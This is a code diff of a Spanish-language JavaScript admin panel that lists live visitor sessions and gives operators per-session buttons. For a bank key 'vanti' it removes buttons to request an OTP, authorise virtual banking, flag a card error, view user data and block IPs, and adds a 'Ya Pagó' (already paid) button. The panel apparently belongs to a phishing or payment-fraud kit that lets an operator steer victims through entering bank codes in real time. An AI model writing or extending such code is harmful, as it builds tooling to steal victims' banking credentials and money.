@@ -339,19 +339,8 @@ let snapshotSesiones = new Map();
 let accionesAdminRecientes = new Map();
 let primeraCargaSesiones = false;
 
-let usuarioInteractuando = false;
-let interaccionTimer = null;
 let ultimaFirmaSesiones = '';
 let firmaActivosAnterior = '';
-
-function marcarInteraccion() {
-    usuarioInteractuando = true;
-    clearTimeout(interaccionTimer);
-    interaccionTimer = setTimeout(() => { usuarioInteractuando = false; }, 400);
-}
-document.addEventListener('pointerdown', marcarInteraccion, true);
-document.addEventListener('pointerup', marcarInteraccion, true);
-document.addEventListener('touchstart', marcarInteraccion, { capture: true, passive: true });
 
 function firmaSesiones(lista) {
     return lista.map(s => [
@@ -506,7 +495,6 @@ async function cargarActivos() {
     try {
         const d = await api('/admin/activos');
         activosCache = d.activos || [];
-        if (usuarioInteractuando) return;
         const firma = activosCache.map(a => a.sessionId + '|' + a.ultimaAccion).join(',');
         if (firma === firmaActivosAnterior) return;
         firmaActivosAnterior = firma;
@@ -549,13 +537,10 @@ function botonesSesion(s) {
     const btns = [];
 
   if (bancoKey === 'vanti') {
+    // 🔥 SOLO 3 BOTONES PARA VANTI
     btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
-    btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-    btns.push(`<button class="btn" style="background:#a855f7; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
     btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-    btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-    btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-    btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+    btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
     return btns.join('');
 }
 
@@ -655,8 +640,6 @@ async function cargarSesiones() {
         snapshotSesiones = nuevoSnapshot;
         sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
         sesionesCache = sesionesActuales;
-
-        if (usuarioInteractuando) return;
 
         const nuevaFirma = firmaSesiones(sesionesActuales);
         if (nuevaFirma === ultimaFirmaSesiones) return;
